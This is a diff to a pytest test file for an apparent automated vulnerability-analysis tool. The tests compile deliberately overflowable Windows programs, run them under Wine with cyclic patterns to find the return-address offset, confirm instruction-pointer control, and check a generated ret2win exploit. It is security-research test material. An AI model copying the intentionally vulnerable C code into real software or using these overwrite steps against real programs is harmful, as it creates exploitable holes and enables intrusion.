@@ -18,6 +18,7 @@ import subprocess
 
 import pytest
 from lykos.analyze import register
+from lykos.analyze.disassemble import enqueue_disassemble
 from lykos.analyze.dynamic import sandbox
 from lykos.analyze.ingest import enqueue_triage, ingest
 from lykos.analyze.poc import capture, primitive
@@ -63,34 +64,48 @@ def pool(store):
         p.stop(grace=3.0)
 
 
-def test_make_wine_capture_recovers_the_controlled_frame_offset(tmp_path):
-    """The capture primitive, in isolation: a cyclic overflow through argv makes Wine's +seh dump
-    report the saved rbp AND the SEH registration frame holding the pattern at offset 32, and a
-    NUL-free sentinel at that offset lands back in both -- a confirmed frame-pointer primitive.
-
-    The faulting PC is NOT the pattern: the `leave` epilogue faults on the corrupt frame before any
-    `ret`, so this is honestly a frame/SEH primitive, not a RIP hijack."""
+def test_make_wine_capture_recovers_clean_rip_control(tmp_path):
+    """The capture primitive, in isolation. A cyclic overflow through argv faults the PE AT the
+    `ret` (the cyclic return address is non-canonical, so the CPU faults at the ret itself with the
+    pattern nowhere in a register) -- Wine's +seh dump still leaks the saved rbp at offset 32. The
+    real control is the RETURN ADDRESS at offset 40: placing the CANONICAL marker there with a
+    short payload makes the `ret` land on it, pc == MARKER -- confirmed clean instruction-pointer
+    control, the strong primitive."""
     exe = _mingw_pe(tmp_path)
     cap = capture.make_wine_capture(str(exe), "arg", ["@@"], 25.0)
     length = 400
     c0 = cap(primitive.cyclic(length))
     assert c0.get("ok") and c0.get("signal_name") == "SIGSEGV", c0.get("reason")
-    # the saved frame pointer is controlled at offset 32 (buf[32]); the SEH frame holds it too
-    regs = primitive.controlled_registers(c0, length, endian="little", word=8)
-    assert regs.get("rbp") == 32, regs
-    seh = c0.get("seh_frame")
-    assert seh and primitive.cyclic_find(primitive._reg_window(seh, 8, "little", 4), length, 4) == 32
-    # the PC is NOT the pattern -- no clean RIP control from this shape
+    # the cyclic faults at the ret: the saved rbp leaks the frame offset, the pc does not hold it
+    assert primitive.controlled_registers(c0, length, endian="little", word=8).get("rbp") == 32
     assert primitive.cyclic_find(primitive._reg_window(c0["pc"], 8, "little", 4), length, 4) == -1
-    # confirm: a NUL-free sentinel at offset 32 reappears in the frame pointer / SEH frame
-    control = primitive.pe_frame_control_input(32, length, 8)
-    assert primitive.pe_frame_confirmed(cap(control), 8) in ("rbp", "seh_frame")
+    # the return address at offset 40 is cleanly controllable: canonical marker -> pc == MARKER
+    import struct
+    m = primitive._ip_marker(8)
+    assert cap(primitive.cyclic(40) + struct.pack("<Q", m)).get("pc") == m
+    # and NOT at a wrong offset (32 does not reach the return slot -> no crash / not the marker)
+    assert cap(primitive.cyclic(32) + struct.pack("<Q", m)).get("pc") != m
 
 
-def test_pe_l2_seh_frame_control_is_confirmed_and_not_overclaimed(store, case, pool, tmp_path):
-    """End to end: the `poc_primitive` stage files a CONFIRMED L2 `seh-frame-control` primitive for
-    a PE strcpy smash -- where the host ptrace path produced nothing -- and does NOT claim RIP
-    control (the effect is memory corruption; the hijack is potential)."""
+def test_pe_frame_sentinel_helpers_confirm_the_weaker_lead():
+    """Unit coverage for the `seh-frame-control` fallback helpers (used when a `leave`-style
+    epilogue faults on the corrupt frame before any `ret` reaches a controlled address, so only the
+    saved frame pointer is controllable). The sentinel is NUL-free and not in the cyclic alphabet,
+    and a slot holding it exactly is a confirmed frame primitive."""
+    assert 0 not in primitive.pe_frame_sentinel(8).to_bytes(8, "little")
+    assert primitive.pe_frame_sentinel(8).to_bytes(8, "little") not in primitive.cyclic(4096)
+    ci = primitive.pe_frame_control_input(32, 200, 8)
+    assert ci[32:40] == primitive.pe_frame_sentinel(8).to_bytes(8, "little")
+    assert primitive.pe_frame_confirmed({"regs": {"rbp": primitive.PE_FRAME_SENTINEL}}, 8) == "rbp"
+    assert primitive.pe_frame_confirmed({"seh_frame": primitive.PE_FRAME_SENTINEL}, 8) == "seh_frame"
+    assert primitive.pe_frame_confirmed({"regs": {"rbp": 0x6161}}, 8) == ""
+
+
+def test_pe_l2_instruction_pointer_control_is_confirmed(store, case, pool, tmp_path):
+    """End to end: the `poc_primitive` stage files a CONFIRMED L2 instruction-pointer-control
+    primitive for a PE strcpy smash -- where the host ptrace path produced nothing. The return
+    address at offset 40 is the controlled slot (the frame-pointer rbp at 32 is the weaker view of
+    the same overflow), and the control is confirmed by the planted marker landing in the PC."""
     exe = _mingw_pe(tmp_path)
     q = JobQueue(store.conn)
     t = ingest(store, case.id, exe, filename="povf.exe")
@@ -105,27 +120,22 @@ def test_pe_l2_seh_frame_control_is_confirmed_and_not_overclaimed(store, case, p
 
     payload = next(e.payload for e in q.events.list(run_id=run.id, limit=80)
                    if e.type == "primitive.done")
-    assert payload["primitive"] == "seh-frame-control", payload
-    assert payload["confirmed"] and payload["level"] == "L2" and payload["offset"] == 32
+    assert payload["primitive"] == "instruction-pointer-control", payload
+    assert payload["confirmed"] and payload["level"] == "L2" and payload["offset"] == 40
 
     pocs = [p for p in PocDAO(store.conn).list_by_target(t.id) if p.verified]
     assert pocs and pocs[0].level == "L2"
-
-    # honesty: the finding headlines memory corruption (CWE-121), and the control-flow hijack is
-    # filed only as a POTENTIAL effect -- never a demonstrated RIP hijack / RCE.
+    # a confirmed RIP hijack headlines a control-flow hijack (critical) with RCE only POTENTIAL
     fs = FindingDAO(store.conn).list_by_target(t.id)
-    hijack = [f for f in fs if "hijack" in (f.title or "").lower() and "demonstrated" in
-              (f.title or "").lower() and "seh" not in (f.title or "").lower()]
-    assert not hijack, [f.title for f in fs]
-    corr = [f for f in fs if f.cwe == "CWE-121" or "stack buffer overflow" in (f.title or "").lower()]
-    assert corr, [(f.title, f.cwe) for f in fs]
+    hij = [f for f in fs if "control-flow hijack" in (f.title or "").lower()]
+    assert hij and any(f.severity == "critical" for f in hij), [(f.title, f.severity) for f in fs]
 
 
-def test_pe_l3_declines_honestly_without_a_win64_weaponizer(store, case, pool, tmp_path):
-    """`build_exploit` is entirely SysV/ELF, so it declines a PE with an honest reason naming the
-    Win64 weaponizer -- rather than running ELF recipes that can only fail to confirm. The decline
-    is explicit (PE declares ip_control=True, so it passes the generic substrate guard)."""
-    exe = _mingw_pe(tmp_path)
+def test_pe_l3_declines_honestly_when_there_is_no_win_target(store, case, pool, tmp_path):
+    """A PE with a confirmable RIP primitive but NO reachable win function (and delivered via an
+    argv/strcpy channel that cannot carry a NUL-bearing Win64 address) declines L3 with an honest
+    reason naming the Win64 ROP weaponizer -- it does not run ELF recipes or fake a result."""
+    exe = _mingw_pe(tmp_path)                             # povf: no win() function, argv channel
     q = JobQueue(store.conn)
     t = ingest(store, case.id, exe, filename="povf.exe")
     enqueue_triage(q, t, force=True)
@@ -139,3 +149,63 @@ def test_pe_l3_declines_honestly_without_a_win64_weaponizer(store, case, pool, t
                    if e.type == "exploit.done")
     assert payload["supported"] is False
     assert "Win64" in payload["note"] and "PE" in payload["note"]
+
+
+_RET2WIN_C = (
+    "#include <windows.h>\n#include <stdio.h>\n"
+    "void win(void){ DWORD w; WriteFile(GetStdHandle((DWORD)-11), \"PWNED_a1b2c3\\n\", 13, &w, 0);"
+    " ExitProcess(0x1337); }\n"
+    "void vuln(FILE *f){ char buf[32]; fread(buf, 1, 200, f); }\n"
+    "int main(int argc, char **argv){ if(argc<2) return 2; FILE*f=fopen(argv[1],\"rb\");"
+    " if(!f) return 3; vuln(f); return 0; }\n")
+
+
+def _mingw_ret2win(tmp_path):
+    cc = shutil.which("x86_64-w64-mingw32-gcc")
+    if not cc:
+        pytest.skip("no mingw cross compiler")
+    if not sandbox._wine():
+        pytest.skip("no wine to execute the PE")
+    c = tmp_path / "rw.c"
+    c.write_text(_RET2WIN_C)
+    exe = tmp_path / "rw.exe"
+    r = subprocess.run([cc, "-O1", "-fno-stack-protector", "-w", str(c), "-o", str(exe)],
+                       capture_output=True, timeout=180)
+    if r.returncode != 0:
+        pytest.skip("mingw cannot link here: " + r.stderr.decode(errors="replace")[:200])
+    return exe
+
+
+def test_pe_l3_ret2win_confirmed_under_wine(store, case, pool, tmp_path):
+    """End to end: a file-reading PE with a reachable `win()` reaches a CONFIRMED L3 ret2win. The
+    `poc_primitive` stage confirms clean RIP control; `build_exploit` redirects it to win() under
+    Wine and confirms win RAN by its stdout marker against a neutralised-slot negative control."""
+    exe = _mingw_ret2win(tmp_path)
+    q = JobQueue(store.conn)
+    t = ingest(store, case.id, exe, filename="rw.exe")
+    for enq in (enqueue_triage, enqueue_disassemble):
+        enq(q, t, force=True)
+        assert pool.wait_idle(180)
+    t = store.targets.get(t.id)
+    assert t.file_type == "pe"
+
+    crash = store.put_artifact(case.id, "crash", data=b"A" * 200).sha256
+    # L2: clean RIP control (file channel -- NUL-tolerant, which ret2win needs)
+    pr = enqueue_primitive(q, t, params={"input_sha": crash, "input_mode": "file", "timeout": 20})
+    assert pool.wait_idle(300) and q.runs.get(pr.id).status == "done"
+    l2 = next(e.payload for e in q.events.list(run_id=pr.id, limit=80)
+              if e.type == "primitive.done")
+    assert l2["primitive"] == "instruction-pointer-control" and l2["confirmed"], l2
+
+    # L3: ret2win -> win(), confirmed by its output under Wine
+    xr = enqueue_exploit(q, t, params={"input_sha": crash, "input_mode": "file", "timeout": 20})
+    assert pool.wait_idle(180) and q.runs.get(xr.id).status == "done"
+    xp = next(e.payload for e in q.events.list(run_id=xr.id, limit=80)
+              if e.type == "exploit.done")
+    assert xp.get("confirmed") and xp.get("exploit") == "ret2win", xp
+
+    l3 = [p for p in PocDAO(store.conn).list_by_target(t.id) if p.verified and p.level == "L3"]
+    assert l3, "no verified L3 ret2win PoC filed"
+    fs = FindingDAO(store.conn).list_by_target(t.id)
+    assert any("ret2win" in (f.title or "").lower() and f.severity == "critical" for f in fs), \
+        [(f.title, f.severity) for f in fs]
